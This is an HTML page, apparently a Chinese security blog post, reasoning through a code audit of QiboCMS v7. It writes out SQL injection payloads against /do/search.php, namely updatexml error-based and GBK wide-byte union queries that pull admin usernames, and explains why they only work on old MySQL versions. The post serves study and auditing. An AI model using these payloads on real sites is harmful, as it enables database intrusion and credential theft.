@@ -1,0 +1,525 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/myicon.png">
+  <link rel="icon" href="/img/myicon.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="zzheff">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="之前看到了齐博cms报错注入漏洞，就想是否可以使用同样的路径发现sql注入，在思考尝试中有了这篇文章，最终发现了sql注入，但版本仅限于4.1&lt;mysql≤5，也就是说2008年mysql出现5.1后，这个洞就用不了了，比较鸡肋，但思考的过程值得记一下。  路径之前的齐博cms报错注入使用了以下两个函数：  query函数中有这么一行： 可以让$query&#x3D;False，然后执行报">
+<meta property="og:type" content="article">
+<meta property="og:title" content="关于齐博cms代码审计的思考">
+<meta property="og:url" content="http://example.com/2022/04/12/qibocms-thinking/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="之前看到了齐博cms报错注入漏洞，就想是否可以使用同样的路径发现sql注入，在思考尝试中有了这篇文章，最终发现了sql注入，但版本仅限于4.1&lt;mysql≤5，也就是说2008年mysql出现5.1后，这个洞就用不了了，比较鸡肋，但思考的过程值得记一下。  路径之前的齐博cms报错注入使用了以下两个函数：  query函数中有这么一行： 可以让$query&#x3D;False，然后执行报">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/qibocms-thinking/Untitled.png">
+<meta property="og:image" content="http://example.com/img/qibocms-thinking/Untitled%202.png">
+<meta property="og:image" content="http://example.com/img/qibocms-thinking/Untitled%201.png">
+<meta property="og:image" content="http://example.com/img/qibocms-thinking/Untitled%203.png">
+<meta property="og:image" content="http://example.com/img/qibocms-thinking/Untitled%204.png">
+<meta property="og:image" content="http://example.com/img/qibocms-thinking/Untitled%205.png">
+<meta property="og:image" content="http://example.com/img/qibocms-thinking/Untitled%206.png">
+<meta property="og:image" content="http://example.com/img/qibocms-thinking/Untitled%207.png">
+<meta property="og:image" content="http://example.com/img/qibocms-thinking/Untitled%208.png">
+<meta property="og:image" content="http://example.com/img/qibocms-thinking/Untitled%209.png">
+<meta property="og:image" content="http://example.com/img/qibocms-thinking/Untitled%2010.png">
+<meta property="og:image" content="http://example.com/img/qibocms-thinking/Untitled%2011.png">
+<meta property="og:image" content="http://example.com/img/qibocms-thinking/Untitled%2012.png">
+<meta property="og:image" content="http://example.com/img/qibocms-thinking/Untitled%2013.png">
+<meta property="og:image" content="http://example.com/img/qibocms-thinking/Untitled%2014.png">
+<meta property="og:image" content="http://example.com/img/qibocms-thinking/Untitled%2015.png">
+<meta property="og:image" content="http://example.com/img/qibocms-thinking/Untitled%2016.png">
+<meta property="article:published_time" content="2022-04-12T03:16:16.875Z">
+<meta property="article:modified_time" content="2022-07-25T09:08:23.188Z">
+<meta property="article:author" content="zzheff">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/img/qibocms-thinking/Untitled.png">
+  
+  
+  <title>关于齐博cms代码审计的思考 - Hexo</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4/github-markdown.min.css" />
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hint.css@2/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.css" />
+  
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.14","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 6.1.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>zzheff&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="关于齐博cms代码审计的思考">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2022-04-12 11:16" pubdate>
+        2022年4月12日 上午
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      3.3k 字
+    </span>
+  
+
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      28 分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">关于齐博cms代码审计的思考</h1>
+            
+            <div class="markdown-body">
+              <blockquote>
+<p>之前看到了齐博cms报错注入漏洞，就想是否可以使用同样的路径发现sql注入，在思考尝试中有了这篇文章，最终发现了sql注入，但版本仅限于4.1&lt;mysql≤5，也就是说2008年mysql出现5.1后，这个洞就用不了了，比较鸡肋，但思考的过程值得记一下。</p>
+</blockquote>
+<h2 id="路径"><a href="#路径" class="headerlink" title="路径"></a>路径</h2><p>之前的齐博cms报错注入使用了以下两个函数：</p>
+<p><img src="/img/qibocms-thinking/Untitled.png" srcset="/img/loading.gif" lazyload><br><img src="/img/qibocms-thinking/Untitled%202.png" srcset="/img/loading.gif" lazyload></p>
+<p>query函数中有这么一行：<br><img src="/img/qibocms-thinking/Untitled%201.png" srcset="/img/loading.gif" lazyload></p>
+<p>可以让$query&#x3D;False，然后执行报错语句，$showerr代码自己定义&#x3D;1，那就不需要我们管了。</p>
+<p>我首先查看了还有文件的调用路径包含这两个函数，结果在：&#x2F;do&#x2F;search.php 这里找到，为了调用其中的内容，我们可以写为：<code>type=keyword&amp;keyword=sql语句</code></p>
+<p><img src="/img/qibocms-thinking/Untitled%203.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="开始调试"><a href="#开始调试" class="headerlink" title="开始调试"></a>开始调试</h2><p>这是一个搜索页面，之前学习PHP代码审计的时候，师傅给的例子就是ESPCMS的搜索框sql注入，所以觉得存在sql注入的可能性挺大的。</p>
+<p>现在开始构造注入语句：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><pre><code class="hljs bash">http://127.0.0.1/qibocms-v7/do/search.php?<span class="hljs-built_in">type</span>=keyword&amp;keyword=%27%20and%20(updatexml(1,concat(0x7e,(substring((select%20username%20from%20qb_memberdata%20where%20groupid=3),1,32))),1))%20--%20<br></code></pre></td></tr></table></figure>
+
+<p>发现我们传入的闭合<code>’</code>单引号被注释了，发现是针对符号%的过滤：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$keyword</span>=str_replace(<span class="hljs-string">&quot;%&quot;</span>,<span class="hljs-string">&quot;\%&quot;</span>,<span class="hljs-variable">$keyword</span>);<br></code></pre></td></tr></table></figure>
+
+<p>发现我们注释符号<code>--</code> 后面的空格被吞掉了，那就在%20后面随意加个，改成：<code>--%20p</code></p>
+<p>上面调试过程中发现有这么一行：</p>
+<p><img src="/img/qibocms-thinking/Untitled%204.png" srcset="/img/loading.gif" lazyload></p>
+<p>那么我们就可以使用宽字节%df进行绕过（这里是个大坑，但此时还没意识到），进入到query函数发现我们成功让sql语句闭合：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">SELECT B.aid FROM qb_keywordid B LEFT JOIN qb_keyword A ON A.<span class="hljs-built_in">id</span>=B.<span class="hljs-built_in">id</span> WHERE A.keywords=<span class="hljs-string">&#x27;運&#x27;</span> and (updatexml(1,concat(0x7e,(substring((select username from qb_memberdata <span class="hljs-built_in">where</span> groupid=3),1,32))),1)) -- p<span class="hljs-string">&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/qibocms-thinking/Untitled%205.png" srcset="/img/loading.gif" lazyload></p>
+<p>把语句放到phpmyadmin中看看是否能返回我们想要的结果，这里构造的sql语句是使用updatexml报出后台管理员用户名，发现我们的sql语句是没有问题的。</p>
+<p><img src="/img/qibocms-thinking/Untitled%206.png" srcset="/img/loading.gif" lazyload></p>
+<p>那我们不是离胜利非常接近了？（并不，接着往下看）</p>
+<h3 id="定位："><a href="#定位：" class="headerlink" title="定位："></a>定位：</h3><p>奇怪的地方来了，这个resource id是什么？$query不应该返回False才对嘛？</p>
+<p><img src="/img/qibocms-thinking/Untitled%207.png" srcset="/img/loading.gif" lazyload></p>
+<p>查了一下mysql_query()得到以下两个结果：看来我们的情况是有红线的这边。</p>
+<p><img src="/img/qibocms-thinking/Untitled%208.png" srcset="/img/loading.gif" lazyload></p>
+<p>来源：<a target="_blank" rel="noopener" href="https://www.php.net/manual/en/function.mysql-query.php">https://www.php.net/manual/en/function.mysql-query.php</a></p>
+<p><img src="/img/qibocms-thinking/Untitled%209.png" srcset="/img/loading.gif" lazyload></p>
+<p>来源：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_30896511/article/details/95709013">https://blog.csdn.net/weixin_30896511&#x2F;article&#x2F;details&#x2F;95709013</a></p>
+<p>因为我们的$method是空，所以只能运行mysql_query()，看来报错注入的方法行不通了，接着往下看看：</p>
+<p><img src="/img/qibocms-thinking/Untitled%2010.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/img/qibocms-thinking/Untitled%2011.png" srcset="/img/loading.gif" lazyload></p>
+<p>发现有mysql_fetch_array()那我们正常注入是不是可以呢？立马试一下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://127.0.0.1/qibocms-v7/do/search.php?<span class="hljs-built_in">type</span>=keyword&amp;keyword=%<span class="hljs-built_in">df</span>%27%20union%20select%20username%20from%20qb_memberdata%20where%20groupid=3%20--%20p<br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/qibocms-thinking/Untitled%2012.png" srcset="/img/loading.gif" lazyload></p>
+<p>这是怎么回事，怎么$array是空呢？</p>
+<p>检查发现我们构造的sql语句没问题</p>
+<p><img src="/img/qibocms-thinking/Untitled%2013.png" srcset="/img/loading.gif" lazyload></p>
+<p>然后自己用<code>mysql_connect() mysql_select_db() mysql_query() mysql_fetch_array()</code>这些函数，尽量贴近齐博cms的原本代码，连一下齐博cms的数据库，看看是否可以正常返回：</p>
+<p><img src="/img/qibocms-thinking/Untitled%2014.png" srcset="/img/loading.gif" lazyload></p>
+<p>发现没有问题。那么就排除了<code>mysql_fetch_array()</code>的问题，只把产生问题的地方定位在query()函数这里：</p>
+<p><img src="/img/qibocms-thinking/Untitled%2015.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="排查："><a href="#排查：" class="headerlink" title="排查："></a>排查：</h3><p>接下来我们把自己写的，没有问题的那些代码放到query()里面执行，结果发现居然也没有Array，然后我们开始改造sql语句，看看正常sql语句能否执行：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">原本的：<span class="hljs-variable">$sqll</span> = <span class="hljs-string">&quot;SELECT B.aid FROM qb_keywordid B LEFT JOIN qb_keyword A ON A.id=B.id WHERE A.keywords=&#x27;運&#x27; union select username from qb_memberdata where groupid=3 -- p&#x27;&quot;</span>;<br>改造一：<span class="hljs-variable">$sqll</span> = <span class="hljs-string">&quot;select username from qb_memberdata where groupid=3&quot;</span>;<br>改造二：<span class="hljs-variable">$sqll</span> = <span class="hljs-string">&quot;select 1 and 1=2 union select username from qb_memberdata where groupid=3&quot;</span>;<br>改造三：<span class="hljs-variable">$sqll</span> = <span class="hljs-string">&quot;SELECT B.aid FROM qb_keywordid B LEFT JOIN qb_keyword A ON A.id=B.id WHERE A.keywords=&#x27;&#x27; union select username from qb_memberdata where groupid=3 -- p&#x27;&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>结果出来了，除了原本的其他改造sql语句全部能执行，这就说明是我们的宽字节闭合出问题了，再确认一下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$sqll</span> = <span class="hljs-string">&quot;SELECT B.aid FROM qb_keywordid B LEFT JOIN qb_keyword A ON A.id=B.id WHERE A.keywords=&#x27;好&#x27; union select username from qb_memberdata where groupid=3 -- p&#x27;&quot;</span>;<br></code></pre></td></tr></table></figure>
+
+<p>发现执行正常，为什么我们看到dbcharset&#x3D;gbk，使用宽字节闭合时会出错呢？在query()中有连接数据库的函数connect()，跟进看一下发生了什么（之前调试都会跳过它，以为只是进行数据库连接，并没有其他用处），结果发现了下面的代码。</p>
+<p><img src="/img/qibocms-thinking/Untitled%2016.png" srcset="/img/loading.gif" lazyload></p>
+<p>赶紧看一下我们的数据库版本，发现是5.5，所以说，宽字节闭合sql语句发生了错误，再看看mysql5.1版本是什么时候发行的，发现是2008年，哎。</p>
+<h2 id="大疑问"><a href="#大疑问" class="headerlink" title="大疑问"></a>大疑问</h2><p>那为什么我们模拟齐博cms源代码，也没有设定连接时必须是gbk，为什么执行时没有出错呢？</p>
+<p>现在把重点放到这个代码上：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mysql_query(<span class="hljs-string">&quot;SET sql_mode=&#x27;&#x27;&quot;</span>)<br></code></pre></td></tr></table></figure>
+
+<p>这里是空的，也就是并没有定义MySQL应该支持的sql语法，对数据的校验等等，具体什么设置，可以参考；<a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000005936172">https://segmentfault.com/a/1190000005936172</a></p>
+<h3 id="小解答："><a href="#小解答：" class="headerlink" title="小解答："></a>小解答：</h3><p>那么这是怎么回事呢？有一种可能就是我们模拟时默认编码是utf8，mysql字符集也是utf8，所以没有问题，如果不设置mysql接收gbk，那么连接时齐博cms发送的是gbk，但是mysql只接收utf8，所以出错了。</p>
+<p>通过这句话，我们就可以设置mysql接收gbk了</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mysql_query(<span class="hljs-string">&quot;SET NAMES &#x27;<span class="hljs-variable">$dbcharset</span>&#x27;&quot;</span>);<br></code></pre></td></tr></table></figure>
+
+<p>怎么把这句话放到我们的sql语句中呢？如果可以执行多行sql语句，那不就是堆叠注入了嘛？但是没有mysqli_multi_query()，所以无法实现。</p>
+<div class="note note-success">
+            <p>最后</p>
+          </div>
+
+
+<p>这些是目前的一些想法，还有很多的不足，师傅们请多指教。</p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%9D%E8%80%83/">代码审计思考</a>
+                    
+                      <a class="hover-with-bg" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%9D%E8%80%83/qibocms/">qibocms</a>
+                    
+                  </div>
+                
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2022/04/12/hello-world/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Hello World</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  
+    <script  src="https://cdn.jsdelivr.net/npm/tocbot@4/dist/tocbot.min.js" ></script>
+  
+  
+    <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.js" ></script>
+  
+  
+    <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4/anchor.min.js" ></script>
+  
+  
+    <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js" ></script>
+  
+
+
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+        typing(title);
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
